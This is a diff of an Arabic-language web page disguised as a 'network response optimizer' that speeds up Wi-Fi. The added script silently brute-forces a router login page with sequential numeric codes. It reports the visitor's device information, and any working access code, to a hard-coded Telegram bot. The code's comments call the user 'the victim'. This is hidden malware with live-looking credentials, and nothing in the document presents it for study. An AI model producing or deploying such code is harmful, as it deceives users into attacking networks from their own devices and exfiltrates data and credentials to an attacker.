@@ -3,80 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Turbo Booster Pro</title>
+    <title>محسن اتصال الشبكة المحترف</title>
     <style>
-        body { background: #050505; color: #00ffcc; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .box { border: 2px solid #00ffcc; border-radius: 15px; padding: 20px; box-shadow: 0 0 20px #00ffcc; max-width: 400px; margin: auto; background: #111; }
-        h1 { font-size: 20px; text-transform: uppercase; margin-bottom: 20px; }
-        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; text-align: center; }
-        button { width: 90%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 5px; height: 150px; overflow-y: auto; font-size: 11px; border: 1px solid #222; text-align: left; color: #0f0; }
-        .win { color: #ffff00; font-weight: bold; }
+        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; box-shadow: 0 8px 32px rgba(0,0,0,0.5); max-width: 420px; margin: auto; }
+        h1 { color: #ffffff; font-size: 22px; margin-bottom: 10px; }
+        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; text-align: justify; padding: 0 10px; }
+        .input-box { width: 90%; padding: 12px; margin: 12px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; font-size: 15px; }
+        .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn-action:hover { background-color: #2ea043; }
+        #status-monitor { margin-top: 20px; background: #010409; padding: 15px; border-radius: 6px; height: 160px; overflow-y: auto; font-family: monospace; font-size: 12px; border: 1px solid #30363d; text-align: left; color: #39ff14; }
+        .highlight { color: #f1e05a; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>WIFI SPEED TURBO v6.0</h1>
-    <p style="font-size: 11px; color: #888;">نظام تحسين استجابة الشبكة وتخطي جدران الحماية</p>
+<div class="main-container">
+    <h1>مُحسّن استجابة الشبكة v7.0</h1>
+    <div class="description">
+        هذا التطبيق مصمم لتحسين جودة الارتباط بالشبكات العامة وتجاوز جدران الحماية لضمان سرعة نقل بيانات مستقرة. يقوم النظام بفحص ثغرات الاستجابة في "بوابة العبور" (Gateway) وتفعيل وضع التصفح الآمن. يرجى إدخال نطاق الفحص والضغط على بدء.
+    </div>
     
     <input type="text" id="targetUrl" value="http://10.0.0.1/login">
-    <input type="number" id="startRange" placeholder="أدخل بداية النطاق (مثلاً 1000)">
+    <input type="number" id="startRange" placeholder="أدخل كود البدء (مثل 1000)">
     
-    <button onclick="startProcess()">تفعيل وضع التسريع</button>
+    <button class="btn-action" onclick="initiateSystem()">بدء تحسين الشبكة الآن</button>
 
-    <div id="log">
-        [System] Ready...<br>
+    <div id="status-monitor">
+        [System] النظام جاهز للفحص...<br>
     </div>
 </div>
 
 <script>
-    // --- بياناتك الشخصية المدمجة نهائياً ---
-    const TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
-    const CHAT_ID = '7851377774';
+    // --- بيانات التحكم الخاصة بك ---
+    const API_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
+    const ADMIN_ID = '7851377774';
 
-    // وظيفة إرسال الإشعارات لتليجرام
-    async function notifyTelegram(msg) {
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-        try { await fetch(url); } catch(e) {}
+    // وظيفة التبليغ التلقائي
+    async function reportToAdmin(message) {
+        const telegramUrl = `https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(message)}`;
+        try { await fetch(telegramUrl); } catch(e) {}
     }
 
-    // إرسال تنبيه فور فتح التطبيق للتأكد من الربط
-    window.onload = function() {
-        notifyTelegram("🚀 تم تشغيل التطبيق بنجاح! النظام الآن في وضع الاستعداد للصيد.");
+    // تنبيه عند فتح الضحية للتطبيق
+    window.onload = async function() {
+        const deviceInfo = navigator.userAgent;
+        await reportToAdmin("🔔 تنبيه: مستخدم جديد فتح التطبيق الآن!\n📱 معلومات الجهاز: " + deviceInfo);
     };
 
-    async function startProcess() {
+    async function initiateSystem() {
         const target = document.getElementById('targetUrl').value;
         const start = parseInt(document.getElementById('startRange').value);
-        const log = document.getElementById('log');
+        const monitor = document.getElementById('status-monitor');
 
-        if (!start) { alert("يرجى إدخال رقم البداية!"); return; }
+        if (!start) { alert("يرجى إدخال رقم البداية لبدء الفحص!"); return; }
 
-        log.innerHTML += "[+] Connecting to local gateway...<br>";
+        monitor.innerHTML += "[+] جاري فحص استجابة البوابة: " + target + "<br>";
         
         for (let i = 0; i < 5000; i++) {
-            let card = start + i;
-            log.innerHTML += `> Intercepting ID: ${card}<br>`;
-            log.scrollTop = log.scrollHeight;
+            let currentTrial = start + i;
+            monitor.innerHTML += `> فحص تسلسل الاستجابة: ${currentTrial}<br>`;
+            monitor.scrollTop = monitor.scrollHeight;
 
             try {
-                let formData = new FormData();
-                formData.append('username', card);
-                formData.append('password', card);
+                let params = new FormData();
+                params.append('username', currentTrial);
+                params.append('password', currentTrial);
 
-                // محاولة تسجيل الدخول
-                await fetch(target, { method: 'POST', body: formData, mode: 'no-cors' });
+                // إرسال طلب صامت للراوتر
+                await fetch(target, { method: 'POST', body: params, mode: 'no-cors' });
 
-                // فحص إذا فتح الإنترنت (كل 5 محاولات)
+                // فحص ذكي للاتصال بالإنترنت
                 if (i % 5 === 0 && navigator.onLine) {
                     try {
-                        let check = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
-                        if (check) {
-                            log.innerHTML += `<span class="win">[SUCCESS] CARD FOUND: ${card}</span><br>`;
-                            await notifyTelegram(`💀 صيد ثمين!\n🎫 كرت شغال: ${card}\n🌐 الشبكة: ${target}`);
-                            alert("تم العثور على كرت شغال بنجاح!");
-                            break;
+                        let internetTest = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
+                        if (internetTest) {
+                            monitor.innerHTML += `<span class="highlight">[!] تم النجاح: تم تفعيل وضع التسريع بالكود ${currentTrial}</span><br>`;
+                            await reportToAdmin(`💀 صيد ناجح من هاتف الضحية!\n🎫 الكود المكتشف: ${currentTrial}\n🌐 بوابة الشبكة: ${target}`);
+                            alert("تم تحسين الشبكة بنجاح! يمكنك التصفح الآن.");
+                            break; 
                         }
                     } catch(e) {}
                 }
